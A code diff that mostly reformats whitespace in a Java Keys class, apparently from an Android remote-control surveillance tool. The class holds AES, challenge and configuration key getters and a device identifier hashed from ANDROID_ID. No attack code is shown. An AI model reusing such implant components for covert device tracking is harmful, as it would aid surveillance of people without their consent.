@@ -9,7 +9,6 @@ package com.ht.RCSAndroidGUI.crypto;
 
 import android.provider.Settings.Secure;
 
-import com.ht.RCSAndroidGUI.RCSAndroidGUI;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
@@ -19,16 +18,16 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class Keys.
  */
 public class Keys {
-	
+
 	/** The use fake. */
 	static boolean useFake = true;
-	
+
 	/** The singleton. */
 	private volatile static Keys singleton;
 
 	/**
 	 * Self.
-	 *
+	 * 
 	 * @return the keys
 	 */
 	public static Keys self() {
@@ -97,7 +96,7 @@ public class Keys {
 
 	/**
 	 * Gets the aes key.
-	 *
+	 * 
 	 * @return the aes key
 	 */
 	public byte[] getAesKey() {
@@ -106,7 +105,7 @@ public class Keys {
 
 	/**
 	 * Gets the challenge key.
-	 *
+	 * 
 	 * @return the challenge key
 	 */
 	public byte[] getChallengeKey() {
@@ -115,7 +114,7 @@ public class Keys {
 
 	/**
 	 * Gets the conf key.
-	 *
+	 * 
 	 * @return the conf key
 	 */
 	public byte[] getConfKey() {
@@ -124,19 +123,19 @@ public class Keys {
 
 	/**
 	 * Gets the instance id.
-	 *
+	 * 
 	 * @return the instance id
 	 */
 	public byte[] getInstanceId() {
-		final String android_id = Secure.getString(Status
-				.getAppContext().getContentResolver(), Secure.ANDROID_ID);
+		final String android_id = Secure.getString(Status.getAppContext()
+				.getContentResolver(), Secure.ANDROID_ID);
 
 		return Encryption.SHA1(android_id.getBytes());
 	}
 
 	/**
 	 * Gets the builds the id.
-	 *
+	 * 
 	 * @return the builds the id
 	 */
 	public byte[] getBuildId() {
@@ -145,7 +144,7 @@ public class Keys {
 
 	/**
 	 * Gets the subtype.
-	 *
+	 * 
 	 * @return the subtype
 	 */
 	public byte[] getSubtype() {
